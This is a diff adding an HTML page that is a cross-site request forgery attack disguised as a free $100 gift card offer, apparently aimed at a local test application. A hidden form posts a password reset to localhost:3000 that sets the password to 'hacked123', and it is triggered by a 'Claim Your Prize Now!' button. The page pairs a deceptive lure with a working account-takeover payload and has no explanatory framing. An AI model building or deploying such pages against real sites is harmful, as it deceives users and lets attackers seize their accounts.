@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Free Gift Card!</title>
+</head>
+<body>
+    <h1>Claim Your Free $100 Gift Card!</h1>
+    <p>Click the button below to claim your prize!</p>
+    
+    
+    <form id="csrfForm" action="http://localhost:3000/reset-password" method="POST" style="display:none;">
+        <input type="hidden" name="password" value="hacked123">
+        <input type="hidden" name="confirmPassword" value="hacked123">
+    </form>
+    
+    <button onclick="document.getElementById('csrfForm').submit()">
+        Claim Your Prize Now!
+    </button>
+    
+    <p><small>By clicking this button, you agree to our terms and conditions</small></p>
+</body>
+</html>
